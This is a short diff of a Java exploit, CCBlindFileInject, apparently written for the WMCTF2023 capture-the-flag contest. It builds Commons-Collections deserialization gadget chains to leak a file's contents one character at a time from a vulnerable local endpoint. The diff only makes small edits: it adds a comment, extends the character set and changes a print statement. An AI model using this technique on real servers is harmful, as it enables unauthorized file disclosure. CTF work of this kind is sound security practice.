@@ -11,17 +11,20 @@ import java.net.URL;
 import java.net.URLEncoder;
 import java.util.*;
 
+/**
+ * WMCTF2023
+ */
 public class CCBlindFileInject {
     public static void main(String[] args) throws Exception {
         guess("http://127.0.0.1:8080/vul","/E:\\1.txt");
     }
     public static void guess(String address,String filename) throws Exception {
-        String strs="abcdefghijklmnopqrstuvwxyz_{}ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        String strs="abcdefghijklmnopqrstuvwxyz_{}ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!";
         boolean symbol=true;
         int index=0;
         String flag="";
         while(symbol){
-            System.out.println(String.format("[*]start to guess %d place",index));
+            System.out.printf("[*]start to guess place %d%n",index);
             for (char c : strs.toCharArray()) {
                 Hashtable hashtable = generateChain(index, c,filename);
                 String expbase64 = SerializeUtils.base64serial(hashtable);
